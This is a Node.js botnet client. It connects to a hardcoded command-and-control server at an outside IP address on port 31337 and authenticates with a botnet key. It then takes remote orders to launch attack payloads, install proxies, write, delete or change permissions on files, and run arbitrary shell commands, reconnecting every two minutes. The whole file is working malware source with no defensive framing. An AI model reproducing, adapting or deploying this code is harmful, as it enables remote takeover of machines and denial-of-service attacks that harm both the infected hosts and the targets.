const { connect } = require('net');
const {
  writeFileSync,
  rmSync,
  chmodSync
} = require('fs');
const {
  dirname
} = require('path');
const { 
  execSync 
} = require('child_process')

const mainNode = "main"

const rootPath = dirname(require.main.filename)

const host = '179.43.175.102'
const port = 31337
const apiKey = 'thisIsMyBotnetKey'

function main () {
  console.log('Starting. . .')
  const clients = connect({
    host,
    port
  }, () => {
    console.log('Connecting to ' + host + ':' + port)
    const payloadConnect = JSON.stringify({
      type : 'connect',
      apiKey,
      mainNode
    }) + `\n`
    clients.write(payloadConnect)
    console.log(`Connected to botnet (${mainNode.toUpperCase()})!`);
    try {
      execSync(`for scr in $(screen -ls | awk '{print $1}'); do screen -S $scr -X kill; done`)
    } catch (err) {
      //console.log(err)
    }
  });
  
  clients.on('data', (data) => {
    try {
      let message = data.toString();
      const command = JSON.parse(message)
      console.log(command)
      if(!command.nodes.includes(mainNode))
        return
      switch (command.type) {
        case 'attack' : 
          execSync(`screen -S ${command.session} -dm bash -c '${command.payload}'`)
          console.log(`Attack ${command.session} | payload: ${command.payload}`)
          var timeout = command.time * 1000
          setTimeout(() => {
            execSync(`screen -ls ${command.session} | grep -E '\s+[0-9]+\.' | awk -F ' ' '{print $1}' | while read s; do screen -XS $s quit; done`)
            console.log(`Attack ${command.session} stopped automatically`)
          }, timeout + 50);
          break;
        case 'stop' : 
          execSync(`screen -ls ${command.session} | grep -E '\s+[0-9]+\.' | awk -F ' ' '{print $1}' | while read s; do screen -XS $s quit; done`)
          console.log(`Attack ${command.session} stopped manually`)
          break;
        case 'proxy' :
          execSync(command.cmd1)
          execSync(command.cmd2)
          console.log('Proxies installed.')
          break;
        case 'write-file' :
          writeFileSync(`${rootPath}/${command.filename}`, command.content)
          console.log(`File ${command.filename} created`)
          break;
        case 'remove-file' :
          rmSync(`${rootPath}/${command.filename}`, {
            maxRetries: 3,
            retryDelay: 100
          })
          console.log(`File ${command.filename} deleted`)
          break;
        case 'write-permission' :
          chmodSync(`${rootPath}/${command.filename}`, command.permission)
          console.log(`File ${command.filename}'s permissions changed.`)
          break;
        case 'exec' :
          execSync(command.cmd)
          console.log('Exec remote command: ' + command.cmd)
          break;
      } 
    } catch (err) {
      console.log(`Error has occurred ${err}`)
      /*
      const payloadError = JSON.stringify({
        type : 'error',
        apiKey,
        mainNode,
        error: err.message
      }) + `\n`
      clients.write(payloadError)
      */
    }

  });
  clients.on('timeout', function () {
      console.log('Client connection timeout. ');
  })
  clients.on('end', () => {
    clients = undefined 
    delete clients 
    console.log('Disconnected from botnet!');
    console.log('Connection ended, reconnecting in 120 seconds. . .')
    setTimeout( () => {
      main()
    }, 120000)
  });
  clients.on('error', (err) => {
    console.log(err)
    clients = undefined 
    delete clients 
    console.log('Botnet offline, reconnecting in 120 seconds. . .')
    setTimeout( () => {
      main()
    }, 120000)
  })
}

main()
